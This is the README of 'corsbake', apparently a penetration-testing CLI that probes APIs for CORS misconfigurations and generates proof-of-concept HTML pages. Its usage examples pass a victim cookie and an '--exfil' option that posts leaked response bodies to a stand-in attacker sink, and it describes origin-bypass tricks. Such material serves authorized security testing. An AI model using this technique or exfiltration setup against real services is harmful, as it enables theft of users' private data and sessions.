# corsbake

Probe a target for CORS misconfigurations and bake a working PoC HTML page.

You suspect an API endpoint reflects `Origin` and serves your session cookie cross-origin. The proof is not a screenshot of response headers; it is a real browser, sat on your attacker domain, fetching the victim's data with `credentials: include` and showing the body. `corsbake` runs the probes, identifies the bypass that landed, writes the HTML PoC, and tells you the next two commands to run. You serve the file, you open it, you screenshot.

[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Status: active](https://img.shields.io/badge/status-active-brightgreen.svg)](#)

## Overview

CORS bugs come in maybe six shapes that pay: exact-origin reflection, null origin, wildcard with credentials, scheme downgrade, suffix bypass, and subdomain wildcard. The diagnosis is mechanical: send the right Origin in the preflight, read what comes back in `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`. The boring part is doing all six with a victim cookie attached, and writing the demo page that turns the bug into a screenshot.

`corsbake` does the six probes in one run, attaches whatever auth header you hand it, and for every probe that resolves to VULNERABLE it bakes a `poc.html` that fetches the target with credentials and dumps the leaked body in the page. An optional `--exfil` URL has the page POST the body to a sink you control, so the demo doubles as a working exploit. Output is a section-rule narrative; read top to bottom, copy the three commands at the end.

## Features

The probes are tuned to the Origin shapes that actually slip through real-world allowlists, not just the spec-textbook cases. Suffix bypass alone catches a recurring pattern in regex-based allowlist code (`^https://victim\.com` accepts `https://victim.com.attacker.example`). Subdomain wildcard catches the inverse: overly-permissive `*.victim.com`. Both pay.

- Six probe families: exact reflection, null, wildcard+credentials, scheme downgrade, suffix bypass, subdomain wildcard
- `--cookie` and `--header` carry victim auth into both the preflight and the actual request
- Bakes a `poc.html` per run that does `fetch(url, {credentials:'include'})` and renders the leaked body
- Optional `--exfil URL` makes the PoC POST the body to your sink for hands-free capture
- `--no-poc` for dry probing in CI; tool exits 0 with a clean summary

## Installation

```bash
git clone https://github.com/daniyalnasir-root/corsbake.git
cd corsbake
python3 cli.py -h
```

Standard library only. No `pip install`.

## Usage

```bash
# Quick probe with no auth, write poc.html if anything is vulnerable
python3 cli.py \
    --url https://app.example.com/api/me \
    --attacker-origin https://attacker.example

# With victim cookie, exfil to a Burp Collaborator-style sink
python3 cli.py \
    --url https://app.example.com/api/me \
    --attacker-origin https://attacker.example \
    --cookie 'session=abcdef; csrf=xyz' \
    --exfil https://attacker.example/sink \
    --out poc-me.html

# Dry probing for CI: no file written, exit code only
python3 cli.py --url https://app.example.com/api/me \
    --attacker-origin https://attacker.example --no-poc
```

## Command Line Options

| Flag | Required | Description |
|------|----------|-------------|
| `--url` | yes | Target endpoint to read cross-origin |
| `--attacker-origin` | yes | Attacker-controlled origin (scheme included) |
| `--cookie` | no | Victim cookie string |
| `--header` | no | Extra victim auth header (`-H` style); repeatable |
| `--exfil` | no | URL the PoC POSTs the leaked body to |
| `--out` | no | PoC HTML output path (default `./poc.html`) |
| `--no-poc` | no | Probe only; do not write a PoC file |
| `--timeout` | no | Per-request timeout (default 10) |

## Output Example

```
$ python3 cli.py --url 'https://httpbin.org/response-headers?...' \
                 --attacker-origin https://attacker.example --cookie sess=demo

════════════════════════════════════════════════════════════════
corsbake on https://httpbin.org/response-headers?...
════════════════════════════════════════════════════════════════

  target           https://httpbin.org/response-headers?...
  attacker origin  https://attacker.example
  victim auth      cookie

▣ exact-origin reflection
     origin sent     https://attacker.example
     ACAO returned   https://attacker.example
     ACAC returned   true
     verdict         VULNERABLE: ACAO reflects attacker origin and credentials allowed

▢ wildcard with credentials
     origin sent     https://random.example
     ACAO returned   (none)
     verdict         safe

════════════════════════════════════════════════════════════════
  artifact
     written  ./poc.html  (1465 bytes)
     serve    python3 -m http.server 8080 --directory .
     open     https://attacker.example/poc.html
════════════════════════════════════════════════════════════════
```

Full unabridged outputs of vulnerable and safe runs live in [`examples/`](examples/).

## Legal Disclaimer

This tool is for authorized security testing and educational use only.
Run it only against systems you own or have explicit written permission to test.
The author accepts no liability for misuse. Unauthorized use may violate
local, state, or federal law.

## Author

Written by **Daniyal Nasir**, a **Cybersecurity Consultant**, **Penetration Tester**, and **VAPT Services** provider with over a decade of **offensive security** work covering **web application security testing**, **API penetration testing**, **cloud security audits**, **mobile app security assessments**, and **red team operations** for Fortune 500 clients and global tech platforms. Project delivery across the **Middle East, Asia, Europe, Africa, and North America**. Maintains an active **bug bounty hunting** portfolio with **responsible vulnerability disclosure** to leading tech companies. Industry certifications: **OSCP**, **LPT**, **CPENT**, **CEH**, **CISA**, **CISM**, **CASP+**.

Reach out: [LinkedIn](https://www.linkedin.com/in/daniyalnasir) · [daniyalnasir.com](https://www.daniyalnasir.com)

## License

MIT, see [LICENSE](LICENSE).
